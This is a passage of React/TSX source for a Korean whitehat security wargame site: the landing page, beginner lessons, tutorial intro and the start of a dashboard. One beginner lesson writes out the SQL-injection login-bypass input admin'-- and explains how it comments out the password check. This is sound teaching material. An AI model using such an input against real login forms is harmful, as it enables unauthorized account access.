        <span onClick={() => setCurrentView('beginner_basics')} style={{ cursor: 'pointer', whiteSpace: 'nowrap', flexShrink: 0, background: 'rgba(56,189,248,0.14)', border: '1px solid #38bdf8', color: '#7dd3fc', padding: '5px 12px', fontWeight: 'bold' }}>🌱 왕초보 시작</span>
        <span onClick={() => setCurrentView('tutorial_intro')} style={{ cursor: 'pointer', whiteSpace: 'nowrap', flexShrink: 0, background: 'rgba(16,185,129,0.15)', border: '1px solid #10b981', color: '#10b981', padding: '5px 12px', fontWeight: 'bold' }}>🎓 튜토리얼 ★</span>
      </div>

      {/* User Profile Pill (항상 고정 노출, 스크롤 대상 아님) */}
      <div style={{ position: 'relative', display: 'flex', alignItems: 'center', borderLeft: '1px solid rgba(255,255,255,0.15)', paddingLeft: '18px', gap: '10px', flexShrink: 0 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '11px', padding: '4px 8px', fontWeight: '900', whiteSpace: 'nowrap', ...getLevelTierBadgeStyle(userLevelTier) }}>
            <RankEmblem type={userLevelTierMeta.iconType} color={userLevelTierMeta.color} size={18} isRainbow={userLevelTierMeta.isRainbow} />
            <span>LV.{userLevel} · {userLevelTier}</span>
          </div>

          <button
            type="button"
            className="header-profile-avatar"
            title="내 프로필"
            onClick={() => setCurrentView('profile')}
          >
            <TitleAvatarBadge title={selectedProfileTitle} size={34} frame="circle" showTierChip={false} />
          </button>
      </div>
    </nav>
  );

  return (
    <div className="cyber-bg-grid">
      {isLoggedIn && <TopBar />}

      <div className="app-viewport-lock">
        <div key={currentView} className={`view-transition ${currentView === 'landing' ? 'landing-glitch-view' : ''}`} style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>

          {/* ==========================================
              VIEW: LANDING
             ========================================== */}
          {currentView === 'landing' && (
            <div
              className="landing-hero-stage"
              style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1, textAlign: 'center', padding: '40px' }}
            >
              <CodeRainCanvas />
              <div className="landing-orb landing-orb-1" />
              <div className="landing-orb landing-orb-2" />
              <div className="landing-orb landing-orb-3" />
              <div className="landing-vignette" />

              <div className="landing-content-layer" style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                <h1 className={`hero-gradient-title hero-title-reveal landing-title-glitch ${isLandingGlitching ? 'is-glitching' : ''}`} style={{ marginBottom: '18px', fontWeight: 900, fontSize: '64px', letterSpacing: '4px' }}>
                  AEGIS CYBER ARENA
                </h1>
                <div className="hero-stagger hero-stagger-2" style={{ fontSize: '14px', color: '#00f2fe', letterSpacing: '4px', fontWeight: 'bold', marginBottom: '12px' }}>NEXT-GEN WARGAME SIMULATION</div>
                <p className="hero-stagger hero-stagger-3" style={{ maxWidth: '560px', color: '#94a3b8', fontSize: '14px', lineHeight: '1.7', marginBottom: '30px' }}>
                  실제 취약한 코드로 공격과 방어를 모두 실습하는 화이트햇 보안 워게임 플랫폼. AI 보안 코치와 함께 초보자부터 심화 단계까지 성장하세요.
                </p>

                <div className="hero-stagger hero-stagger-4" style={{ display: 'flex', gap: '14px', flexWrap: 'wrap', justifyContent: 'center', marginBottom: '30px' }}>
                  <div className="landing-stat-pill">
                    <span style={{ fontSize: '22px', color: '#00f2fe', fontWeight: 900 }}>{masterProblemDB.length}+</span>
                    <span style={{ fontSize: '11px', color: '#64748b' }}>실전 문제</span>
                  </div>
                  <div className="landing-stat-pill">
                    <span style={{ fontSize: '22px', color: '#a855f7', fontWeight: 900 }}>{categories.length}</span>
                    <span style={{ fontSize: '11px', color: '#64748b' }}>보안 카테고리</span>
                  </div>
                  <div className="landing-stat-pill">
                    <span style={{ fontSize: '22px', color: '#facc15', fontWeight: 900 }}>9</span>
                    <span style={{ fontSize: '11px', color: '#64748b' }}>레벨 티어</span>
                  </div>
                  <div className="landing-stat-pill">
                    <span style={{ fontSize: '22px', color: '#10b981', fontWeight: 900 }}>AI</span>
                    <span style={{ fontSize: '11px', color: '#64748b' }}>보안 코치 상시 대기</span>
                  </div>
                </div>

                <div className="tutorial-banner hero-stagger hero-stagger-5" onClick={() => setCurrentView('tutorial_intro')} style={{ width: '540px', maxWidth: '90vw', padding: '20px 24px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '35px' }}>
                  <div style={{ display: 'flex', gap: '15px', alignItems: 'center', textAlign: 'left' }}>
                    <span style={{ fontSize: '28px' }}>🎓</span>
                    <div>
                      <div style={{ fontSize: '16px', fontWeight: 'bold', color: '#10b981' }}>처음이신가요? 입문 튜토리얼부터 시작하세요!</div>
                      <div style={{ fontSize: '12px', color: '#a7f3d0', marginTop: '2px' }}>보안 용어를 몰라도 괜찮아요 — 문제마다 쉬운 설명이 함께 제공됩니다.</div>
                    </div>
                  </div>
                  <button style={{ background: '#10b981', color: '#000', border: 'none', padding: '8px 16px', fontSize: '13px', fontWeight: 'bold', cursor: 'pointer' }}>시작 →</button>
                </div>

                <button onClick={() => setCurrentView('beginner_basics')} style={{ marginTop: '-18px', marginBottom: '28px', background: 'rgba(56,189,248,0.08)', border: '1px solid rgba(56,189,248,0.55)', color: '#bae6fd', padding: '10px 18px', cursor: 'pointer', fontWeight: 800 }}>
                  🌱 문제 풀기 전, 웹 기초부터 가볍게 보기
                </button>

                <div className="hero-stagger hero-stagger-6" style={{ display: 'flex', gap: '15px', flexWrap: 'wrap', justifyContent: 'center' }}>
                  <button onClick={() => { setWargameStage('hub'); setCurrentView(isLoggedIn ? 'wargames' : 'login'); }} className="cyber-btn-cyan" style={{ padding: '14px 40px', fontSize: '15px', fontWeight: 'bold' }}>🎮 GAME</button>
                  <button onClick={() => setCurrentView(isLoggedIn ? 'main' : 'login')} className="cyber-btn-purple" style={{ padding: '14px 40px', fontSize: '15px', fontWeight: 'bold' }}>🏠 HOME</button>
                </div>
              </div>
            </div>
          )}

          {currentView === 'beginner_basics' && (
            <div style={{ width: '90%', maxWidth: '980px', margin: '30px auto', display: 'flex', flexDirection: 'column', gap: '18px', flex: 1 }}>
              <div className="cyber-card-main" style={{ padding: '30px', borderLeft: '5px solid #38bdf8' }}>
                <div style={{ color: '#7dd3fc', fontSize: '12px', fontWeight: 900, letterSpacing: '1.5px' }}>NO EXPERIENCE NEEDED</div>
                <h2 style={{ margin: '6px 0 10px', color: '#e0f2fe' }}>🌱 왕초보 시작</h2>
                <p style={{ margin: 0, color: '#cbd5e1', lineHeight: 1.7 }}>보안 문제를 풀기 전에 웹이 어떻게 보이고 움직이는지 먼저 알아봐요. 외울 내용은 없습니다.</p>
              </div>

              <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
                {([
                  ['web', '🌐 웹은 어떻게 열릴까?'],
                  ['practice', '🔎 문제 읽는 법'],
                ] as const).map(([id, label]) => (
                  <button key={id} onClick={() => setBeginnerTopic(id)} style={{ cursor: 'pointer', padding: '10px 14px', border: `1px solid ${beginnerTopic === id ? '#38bdf8' : '#475569'}`, background: beginnerTopic === id ? 'rgba(56,189,248,0.15)' : 'rgba(15,23,42,0.7)', color: beginnerTopic === id ? '#e0f2fe' : '#94a3b8', fontWeight: 800 }}>{label}</button>
                ))}
              </div>

              {beginnerTopic === 'web' && <div className="cyber-card-main" style={{ padding: '28px' }}>
                <h3 style={{ marginTop: 0, color: '#67e8f9' }}>주소를 입력하면 무슨 일이 일어날까요?</h3>
                <p style={{ color: '#cbd5e1', lineHeight: 1.7 }}>브라우저는 웹사이트의 주소를 보고 서버에 “이 페이지를 보여 주세요”라고 요청합니다. 서버는 HTML, CSS, JavaScript 파일을 보내고, 브라우저가 이를 조립해 지금 보는 화면을 만듭니다.</p>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(170px, 1fr))', gap: '12px', marginTop: '20px' }}>
                  {[['1', '브라우저', '주소를 열고 요청을 보냄'], ['2', '서버', '필요한 파일을 찾아 응답'], ['3', '화면', '파일을 조립해 페이지를 그림']].map(([n, title, text]) => <div key={n} style={{ padding: '16px', border: '1px solid rgba(56,189,248,0.35)', background: 'rgba(14,116,144,0.08)' }}><div style={{ color: '#38bdf8', fontWeight: 900 }}>0{n}. {title}</div><div style={{ color: '#cbd5e1', fontSize: '13px', marginTop: '8px', lineHeight: 1.55 }}>{text}</div></div>)}
                </div>
                <div style={{ marginTop: '20px', padding: '18px', borderLeft: '4px solid #facc15', background: 'rgba(250,204,21,0.06)' }}>
                  <b style={{ color: '#fde68a' }}>이게 첫 문제와 어떻게 연결되나요?</b>
                  <p style={{ color: '#e2e8f0', lineHeight: 1.7, margin: '8px 0' }}>웹사이트는 사용자가 입력한 값을 서버로 보냅니다. 서버가 그 값을 코드에 그대로 이어 붙이면, 원래는 “이름”이어야 할 입력이 코드의 일부처럼 작동할 수 있어요.</p>
                  <div className="code-snippet">입력칸의 값 → 서버 코드의 <span style={{ color: '#facc15' }}>빈 자리</span> → 화면 결과</div>
                  <p style={{ color: '#cbd5e1', lineHeight: 1.65, margin: '10px 0 0', fontSize: '13px' }}>튜토리얼에서는 이 연결을 직접 눈으로 확인합니다. 중요한 건 어려운 명령을 외우는 것이 아니라, <b>“내가 쓴 글자가 코드의 어느 자리에 들어갈까?”</b>를 보는 거예요.</p>
                </div>
                <div style={{ marginTop: '18px', padding: '18px', border: '1px solid rgba(168,85,247,0.4)', background: 'rgba(88,28,135,0.08)' }}>
                  <h4 style={{ color: '#d8b4fe', margin: '0 0 10px' }}>서버가 데이터를 찾을 때 쓰는 SQL 문장</h4>
                  <p style={{ color: '#e2e8f0', lineHeight: 1.7, margin: '0 0 10px' }}>SQL은 서버가 데이터베이스에 “어떤 정보를 찾아 줘”라고 묻는 언어예요. 엑셀 표에서 조건에 맞는 행을 찾는 것과 비슷합니다.</p>
                  <div className="code-snippet">SELECT * FROM users WHERE id='admin'</div>
                  <ul style={{ color: '#cbd5e1', lineHeight: 1.8, paddingLeft: '20px', marginBottom: 0 }}>
                    <li><code>SELECT</code>: “보여 줘”라는 뜻입니다.</li>
                    <li><code>*</code>: 열을 전부 보여 달라는 뜻입니다.</li>
                    <li><code>FROM users</code>: <code>users</code>라는 회원 목록에서 찾으라는 뜻입니다.</li>
                    <li><code>WHERE id='admin'</code>: 그중 아이디가 admin인 행만 고르라는 조건입니다. 따옴표는 admin이 숫자가 아니라 글자라는 표시예요.</li>
                  </ul>
                </div>
              </div>}

              {beginnerTopic === 'tools' && <div className="cyber-card-main" style={{ padding: '28px' }}>
                <h3 style={{ marginTop: 0, color: '#67e8f9' }}>개발자 도구는 웹페이지를 들여다보는 돋보기예요</h3>
                <p style={{ color: '#cbd5e1', lineHeight: 1.7 }}>크롬·엣지에서 <code>F12</code> 또는 <code>Ctrl + Shift + I</code>를 누르면 열립니다. 처음에는 아래 두 탭만 보면 충분해요.</p>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))', gap: '14px' }}>
                  <div style={{ padding: '16px', border: '1px solid rgba(56,189,248,0.35)' }}><b style={{ color: '#38bdf8' }}>Elements</b><p style={{ color: '#cbd5e1', fontSize: '13px', lineHeight: 1.6 }}>화면의 글·버튼이 어떤 HTML로 만들어졌는지 봅니다. 마우스 선택 아이콘을 누른 뒤 페이지 요소를 클릭해 보세요.</p></div>
                  <div style={{ padding: '16px', border: '1px solid rgba(56,189,248,0.35)' }}><b style={{ color: '#38bdf8' }}>Console</b><p style={{ color: '#cbd5e1', fontSize: '13px', lineHeight: 1.6 }}>브라우저가 알려 주는 메시지 창입니다. 오류가 생기면 빨간 글씨가 이곳에 나타납니다.</p></div>
                </div>
                <p style={{ color: '#94a3b8', fontSize: '13px', lineHeight: 1.65, marginBottom: 0 }}>보안 문제에서 “입력값이 화면에 그대로 출력된다”는 말이 나오면 Elements를 떠올리세요. 태그가 글자로 보이는지, 진짜 화면 요소로 바뀌는지를 확인하는 곳입니다.</p>
              </div>}

              {beginnerTopic === 'code' && <div className="cyber-card-main" style={{ padding: '28px' }}>
                <h3 style={{ marginTop: 0, color: '#67e8f9' }}>웹페이지는 세 가지 역할이 합쳐져 보여요</h3>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '14px' }}>
                  {[['HTML', '뼈대', '<button>로그인</button>', '#fb923c'], ['CSS', '꾸미기', 'button { color: skyblue; }', '#a78bfa'], ['JavaScript', '움직임', 'button.onclick = openLogin;', '#34d399']].map(([name, role, sample, color]) => <div key={name} style={{ padding: '16px', border: `1px solid ${color}66` }}><b style={{ color }}>{name} — {role}</b><p style={{ color: '#cbd5e1', fontSize: '13px' }}>{name === 'HTML' ? '글과 버튼처럼 화면에 있는 요소를 만듭니다.' : name === 'CSS' ? '색, 크기, 위치처럼 보이는 모습을 정합니다.' : '클릭했을 때처럼 화면의 행동을 정합니다.'}</p><code style={{ color: '#e2e8f0', fontSize: '12px' }}>{sample}</code></div>)}
                </div>
                <p style={{ color: '#94a3b8', fontSize: '13px', marginBottom: 0 }}>이제 튜토리얼에서 코드가 나오면 “뼈대·꾸미기·행동 중 무엇일까?”만 떠올려도 충분합니다.</p>
              </div>}

              {beginnerTopic === 'practice' && <div className="cyber-card-main" style={{ padding: '28px' }}>
                <h3 style={{ marginTop: 0, color: '#67e8f9' }}>튜토리얼을 열면 이 세 가지만 찾아보세요</h3>
                <p style={{ color: '#cbd5e1', lineHeight: 1.7 }}>처음부터 코드를 전부 읽을 필요는 없습니다. 문제 화면에서 아래 순서대로 한 줄씩 연결하면 됩니다.</p>
                <div style={{ display: 'grid', gap: '14px' }}>
                  <div style={{ padding: '17px', border: '1px solid rgba(56,189,248,0.4)', background: 'rgba(14,116,144,0.07)' }}>
                    <b style={{ color: '#7dd3fc' }}>1. 어디에 입력하나요?</b>
                    <p style={{ color: '#cbd5e1', lineHeight: 1.65, marginBottom: 0 }}>로그인 아이디, 검색어, 게시글처럼 사용자가 직접 쓰는 칸을 찾습니다. 그 값은 보통 서버 코드에서 <code>id</code>, <code>name</code>, <code>query</code> 같은 변수 이름으로 받아옵니다.</p>
                  </div>
                  <div style={{ padding: '17px', border: '1px solid rgba(56,189,248,0.4)', background: 'rgba(14,116,144,0.07)' }}>
                    <b style={{ color: '#7dd3fc' }}>2. 그 값이 어디에 들어가나요?</b>
                    <p style={{ color: '#cbd5e1', lineHeight: 1.65, marginBottom: '8px' }}>코드에서 입력 변수가 들어간 줄을 찾습니다. 아래처럼 따옴표 사이에 이어 붙으면, 입력이 단순한 이름이 아니라 문장의 일부가 될 수 있습니다.</p>
                    <div className="code-snippet">SELECT * FROM users WHERE id='<span style={{ color: '#facc15' }}>입력값</span>'</div>
                    <p style={{ color: '#cbd5e1', lineHeight: 1.65, margin: '10px 0 0', fontSize: '13px' }}>예를 들어 <code>jnuh</code>라는 아이디를 가진 사람을 찾는 구문은 <code>SELECT * FROM users WHERE id='jnuh'</code>입니다. <code>users</code> 목록에서 <code>id</code>가 jnuh인 사람을 찾아 달라는 뜻이에요.</p>
                  </div>
                  <div style={{ padding: '17px', border: '1px solid rgba(56,189,248,0.4)', background: 'rgba(14,116,144,0.07)' }}>
                    <b style={{ color: '#7dd3fc' }}>3. 결과가 어디에 보이나요?</b>
                    <p style={{ color: '#cbd5e1', lineHeight: 1.65, marginBottom: 0 }}>서버가 만든 결과는 로그인 성공 화면, 검색 결과, 경고창처럼 다시 브라우저에 보입니다. XSS 문제는 이 마지막 단계에서 입력한 글이 ‘글’이 아니라 ‘화면 요소나 코드’가 되는지 살펴보는 문제예요.</p>
                  </div>
                </div>
                <div style={{ marginTop: '18px', padding: '16px', borderLeft: '4px solid #34d399', background: 'rgba(16,185,129,0.08)', color: '#d1fae5', lineHeight: 1.7 }}>
                  <b>문제를 풀 때의 작은 습관:</b> 설명을 읽고 바로 정답을 보지 말고, 먼저 “입력칸은 어디지?”, “코드에서 이 값은 어디에 붙지?”를 한 번 찾아보세요. 그 다음 힌트로 확인하면 훨씬 덜 외우게 됩니다.
                </div>
                <div style={{ marginTop: '18px', padding: '18px', border: '1px solid rgba(250,204,21,0.45)', background: 'rgba(250,204,21,0.06)' }}>
                  <h4 style={{ color: '#fde68a', margin: '0 0 10px' }}>첫 문제: 왜 <code>admin'--</code>인가요?</h4>
                  <p style={{ color: '#e2e8f0', lineHeight: 1.7 }}>원래 서버는 입력값을 아래 빈 자리에 붙여 SQL 문장을 만들어요. 아이디에는 글자만 올 것이라고 믿고 만든 코드입니다.</p>
                  <div className="code-snippet">SELECT * FROM users WHERE id='<span style={{ color: '#facc15' }}>입력값</span>' AND pw='비밀번호'</div>
                  <p style={{ color: '#e2e8f0', lineHeight: 1.7 }}>여기에 <code>admin'--</code>을 넣으면 첫 번째 <code>'</code>가 <code>admin</code>이라는 글자를 감싼 따옴표를 닫습니다. 그 뒤의 <code>--</code>는 SQL에서 “여기부터 뒤는 메모이니 실행하지 마”라는 주석 표시예요.</p>
                  <div className="code-snippet">SELECT * FROM users WHERE id='admin'<span style={{ color: '#94a3b8' }}> -- ' AND pw='비밀번호' (주석이라 무시)</span></div>
                  <p style={{ color: '#d1fae5', lineHeight: 1.7, marginBottom: 0 }}>그래서 비밀번호를 확인하는 뒷부분이 실행되지 않습니다. 이 실습의 핵심은 <b>특수한 글자(-)가 입력값으로만 남지 않고 SQL 문장의 문법이 되어 버렸다</b>는 점입니다. 하이픈 두 개(<code>--</code>)가 주석을 시작하는 핵심 역할을 합니다.</p>
                </div>
              </div>}

              <button onClick={() => setCurrentView('tutorial_intro')} className="cyber-btn-cyan" style={{ alignSelf: 'flex-start', padding: '13px 22px', fontWeight: 900 }}>이제 튜토리얼 시작하기 →</button>
            </div>
          )}

          {/* ==========================================
              VIEW: TUTORIAL INTRO (초보자 완벽 가이드)
             ========================================== */}
          {currentView === 'tutorial_intro' && (
            <div style={{ width: '90%', maxWidth: '960px', margin: '30px auto', display: 'flex', flexDirection: 'column', gap: '20px', flex: 1 }}>
              <div className="cyber-card-main" style={{ padding: '36px', borderLeft: '5px solid #10b981', background: 'linear-gradient(180deg, #071520 0%, #030811 100%)' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '14px', marginBottom: '16px' }}>
                  <span style={{ fontSize: '36px' }}>🔰</span>
                  <div>
                    <span style={{ fontSize: '11px', color: '#10b981', fontWeight: 900, letterSpacing: '2px' }}>BEGINNER FRIENDLY GUIDE</span>
                    <h2 style={{ margin: '2px 0 0 0', fontSize: '24px', color: '#10b981', fontWeight: 900 }}>
                      보안이 처음이어도 괜찮아요! 3분 완벽 입문 가이드
                    </h2>
                  </div>
                </div>

                <p style={{ fontSize: '14.5px', color: '#cbd5e1', lineHeight: '1.85', marginBottom: '25px' }}>
                  어려운 프로그래밍이나 해킹 지식이 전혀 없어도 누구나 즐길 수 있습니다.<br />
                  이곳은 지루한 객관식 시험이 아니라, <strong>실제 상황을 조작해보며 원리를 자연스럽게 깨우치는 체험형 놀이터</strong>예요.
                </p>

                {/* 1. 공격과 방어 개념 비유 */}
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px', marginBottom: '28px' }}>
                  <div style={{ background: 'rgba(239, 68, 68, 0.08)', border: '1px solid rgba(239, 68, 68, 0.4)', padding: '18px 20px', borderRadius: '4px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
                      <span style={{ fontSize: '20px' }}>🗡️</span>
                      <h4 style={{ color: '#ef4444', margin: 0, fontSize: '15px', fontWeight: 900 }}>HACKING (공격자 시점)</h4>
                    </div>
                    <p style={{ fontSize: '13px', color: '#cbd5e1', lineHeight: '1.7', margin: 0 }}>
                      문이 잠겨 있는지 확인해보는 <strong>'선의의 열쇠공'</strong> 역할이에요.<br />
                      시스템의 빈틈에 특수한 입력값을 넣어보고, 비정상적으로 뚫리는 현상을 직접 확인해 봅니다.
                    </p>
                  </div>
                  <div style={{ background: 'rgba(16, 185, 129, 0.08)', border: '1px solid rgba(16, 185, 129, 0.4)', padding: '18px 20px', borderRadius: '4px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
                      <span style={{ fontSize: '20px' }}>🛡️</span>
                      <h4 style={{ color: '#10b981', margin: 0, fontSize: '15px', fontWeight: 900 }}>SECURITY (수호자 시점)</h4>
                    </div>
                    <p style={{ fontSize: '13px', color: '#cbd5e1', lineHeight: '1.7', margin: 0 }}>
                      취약한 문에 튼튼한 이중 잠금장치를 다는 <strong>'보안관'</strong> 역할이에요.<br />
                      위험한 코드를 발견하고, 공격자가 침입하지 못하도록 안전한 코드로 수정(패치)해 봅니다.
                    </p>
                  </div>
                </div>

                {/* 2. 문제 푸는 3단계 공식 */}
                <div style={{ background: 'rgba(0, 242, 254, 0.05)', border: '1px solid rgba(0, 242, 254, 0.25)', padding: '22px', borderRadius: '6px', marginBottom: '28px' }}>
                  <h4 style={{ color: '#00f2fe', margin: '0 0 14px 0', fontSize: '15px', fontWeight: 900, display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <span>🎯</span> 문제 푸는 초간단 3단계 공식
                  </h4>
                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '14px' }}>
                    <div style={{ background: 'rgba(2, 6, 23, 0.6)', padding: '14px', border: '1px solid rgba(255,255,255,0.08)' }}>
                      <div style={{ color: '#38bdf8', fontWeight: 900, fontSize: '12px', marginBottom: '4px' }}>STEP 1. 시나리오 읽기</div>
                      <div style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6' }}>
                        문제를 열면 어떤 상황인지 쉬운 비유로 설명해 줍니다. 무엇을 입력해야 하는지 목표를 확인하세요.
                      </div>
                    </div>
                    <div style={{ background: 'rgba(2, 6, 23, 0.6)', padding: '14px', border: '1px solid rgba(255,255,255,0.08)' }}>
                      <div style={{ color: '#10b981', fontWeight: 900, fontSize: '12px', marginBottom: '4px' }}>STEP 2. 터미널에 입력 & RUN</div>
                      <div style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6' }}>
                        직접 코딩할 필요 없이, 안내된 정답 텍스트를 검은색 터미널 입력창에 타이핑하고 [RUN]을 누르세요.
                      </div>
                    </div>
                    <div style={{ background: 'rgba(2, 6, 23, 0.6)', padding: '14px', border: '1px solid rgba(255,255,255,0.08)' }}>
                      <div style={{ color: '#facc15', fontWeight: 900, fontSize: '12px', marginBottom: '4px' }}>STEP 3. FLAG 복사 & 제출</div>
                      <div style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6' }}>
                        공격/방어 성공 시 <code style={{ color: '#facc15' }}>FLAG{`{...}`}</code> 비밀 코드가 나옵니다. 복사해서 제출하면 XP를 획득합니다!
                      </div>
                    </div>
                  </div>
                </div>

                {/* 3. 초보자를 위한 3대 안심 장치 */}
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: '14px', marginBottom: '30px' }}>
                  <div style={{ display: 'flex', gap: '10px', alignItems: 'flex-start' }}>
                    <span style={{ fontSize: '20px' }}>💡</span>
                    <div>
                      <div style={{ fontSize: '13px', fontWeight: 900, color: '#facc15' }}>명쾌한 힌트 & 정답 제공</div>
                      <div style={{ fontSize: '12px', color: '#94a3b8', marginTop: '2px', lineHeight: '1.5' }}>
                        조금이라도 헷갈리면 [막히면 힌트 보기]를 누르세요. 정답과 입력 방법이 친절하게 적혀 있습니다.
                      </div>
                    </div>
                  </div>
                  <div style={{ display: 'flex', gap: '10px', alignItems: 'flex-start' }}>
                    <span style={{ fontSize: '20px' }}>🤖</span>
                    <div>
                      <div style={{ fontSize: '13px', fontWeight: 900, color: '#c084fc' }}>AI 보안 코치 상시 대기</div>
                      <div style={{ fontSize: '12px', color: '#94a3b8', marginTop: '2px', lineHeight: '1.5' }}>
                        실습 창 안에서 [AI 보안 코치]를 누르면 언제든 이해하기 쉬운 비유로 개념을 질문할 수 있습니다.
                      </div>
                    </div>
                  </div>
                  <div style={{ display: 'flex', gap: '10px', alignItems: 'flex-start' }}>
                    <span style={{ fontSize: '20px' }}>🖥️</span>
                    <div>
                      <div style={{ fontSize: '13px', fontWeight: 900, color: '#38bdf8' }}>실제 웹 브라우저 UI</div>
                      <div style={{ fontSize: '12px', color: '#94a3b8', marginTop: '2px', lineHeight: '1.5' }}>
                        로그인창, 검색창 등 실제 웹사이트 화면이 함께 보여 나의 입력이 어떻게 동작하는지 눈으로 볼 수 있어요.
                      </div>
                    </div>
                  </div>
                </div>

                {/* 시작 버튼 */}
                <div style={{ display: 'flex', gap: '14px', flexWrap: 'wrap', paddingTop: '10px', borderTop: '1px solid rgba(255,255,255,0.08)' }}>
                  <button
                    onClick={() => startProblemSession(masterProblemDB[0])}
                    className="cyber-btn-cyan"
                    style={{ border: '1px solid #10b981', color: '#10b981', padding: '14px 32px', fontSize: '14px', fontWeight: 900, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px' }}
                  >
                    <span>🚀</span> 첫 번째 튜토리얼 문제 시작하기 (로그인 우회 기초) →
                  </button>
                  <button
                    onClick={() => { setWargameStage('browse'); setActiveLevelTier(1); setCurrentView('wargames'); }}
                    style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid #475569', color: '#cbd5e1', padding: '14px 22px', fontSize: '13px', fontWeight: 'bold', cursor: 'pointer' }}
                  >
                    📖 Level 1 전체 문제 목록 보기
                  </button>
                  <button
                    onClick={() => { setWargameStage('hub'); setCurrentView('wargames'); }}
                    style={{ background: 'transparent', border: '1px solid rgba(255,255,255,0.15)', color: '#94a3b8', padding: '14px 20px', fontSize: '13px', cursor: 'pointer' }}
                  >
                    전체 섹터 허브
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* ==========================================
              VIEW: MAIN DASHBOARD
             ========================================== */}
          {currentView === 'main' && (
            <div style={{ width: '90%', maxWidth: '1400px', margin: '30px auto', display: 'flex', flexDirection: 'column', gap: '30px', flex: 1 }}>
              {/* Profile Overview Card */}
              <div onClick={() => setCurrentView('profile')} className="cyber-card-main" style={{ display: 'grid', gridTemplateColumns: '1.4fr 1fr', padding: '30px', gap: '30px', cursor: 'pointer' }}>
                <div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '10px' }}>
                    <h2 style={{ margin: 0, fontSize: '32px', color: '#fff', fontWeight: 900 }}>{username}</h2>
                    <span style={{ fontSize: '13px', padding: '4px 10px', display: 'inline-flex', alignItems: 'center', gap: '6px', fontWeight: 900, color: selectedProfileTitle.color, border: `1px solid ${selectedProfileTitle.color}`, background: `${selectedProfileTitle.color}22`, boxShadow: `0 0 14px ${selectedProfileTitle.color}66` }}>
                      {selectedProfileTitle.kind === 'level'
                        ? <RankEmblem type={selectedProfileTitle.iconType ?? 'sprout'} color={selectedProfileTitle.color} size={18} isRainbow={selectedProfileTitle.meta?.isRainbow} />
                        : <span>{selectedProfileTitle.icon}</span>}
                      {selectedProfileTitle.kind === 'mastery' ? `${selectedProfileTitle.categoryName} T${selectedProfileTitle.tier}` : selectedProfileTitle.name}
                    </span>
                  </div>
                  <p style={{ fontSize: '13px', color: '#94a3b8', margin: 0 }}>💡 프로필을 클릭하면 8축 전술 레이더 차트와 상세 역량 정보를 확인할 수 있습니다.</p>
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', justifyContent: 'center', gap: '10px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '12px', fontWeight: 'bold' }}>
                    <span style={{ color: '#facc15' }}>{isMaxXp ? `★ LEVEL ${userLevel} · MAX XP` : `LEVEL ${userLevel} XP`}</span>
                    <span style={{ color: '#f8fafc' }}>
                      {isMaxXp ? `${formatExp(MAX_TOTAL_XP)} / ${formatExp(MAX_TOTAL_XP)} XP (100%) · DB 최대치 달성` : `${formatExp(currentExp)} / ${formatExp(requiredExp)} XP (${levelExpPercent.toFixed(1)}%)`}
                    </span>
                  </div>
                  <div style={{ width: '100%', height: '12px', backgroundColor: '#010307', border: '1px solid rgba(250, 204, 21, 0.35)', overflow: 'hidden' }}>
                    <div className={isMaxXp ? 'rainbow-mastery-bar' : ''} style={{ width: `${isMaxXp ? 100 : levelExpPercent}%`, height: '100%', background: isMaxXp ? undefined : 'linear-gradient(90deg, #f59e0b, #facc15)', transition: 'width 0.4s ease' }} />
                  </div>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', marginTop: '4px' }}>
                    <div style={{ padding: '10px', background: 'rgba(74,222,128,0.06)', border: '1px solid rgba(74,222,128,0.2)' }}>
                      <div style={{ fontSize: '11px', color: '#64748b' }}>해결한 FLAG</div>
                      <div style={{ fontSize: '20px', color: '#4ade80', fontWeight: 'bold', marginTop: '2px' }}>{effectiveSolvedIds.length}개</div>
                    </div>
                    <div style={{ padding: '10px', background: 'rgba(0,242,254,0.06)', border: '1px solid rgba(0,242,254,0.2)' }}>
                      <div style={{ fontSize: '11px', color: '#64748b' }}>누적 총 EXP</div>
                      <div style={{ fontSize: '20px', color: '#00f2fe', fontWeight: 'bold', marginTop: '2px' }}>{formatExp(totalExp)}</div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Action Blocks Grid */}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(210px, 1fr))', gap: '20px' }}>
                <div onClick={() => { setWargameStage('hub'); setCurrentView('wargames'); }} className="cyber-action-block" style={{ padding: '24px', cursor: 'pointer', textAlign: 'center' }}>
                  <Play size={36} color="#00f2fe" style={{ margin: '0 auto 12px' }} />
                  <h3 style={{ margin: 0, color: '#00f2fe', fontSize: '17px', fontWeight: 'bold' }}>PROJECT WARGAMES</h3>
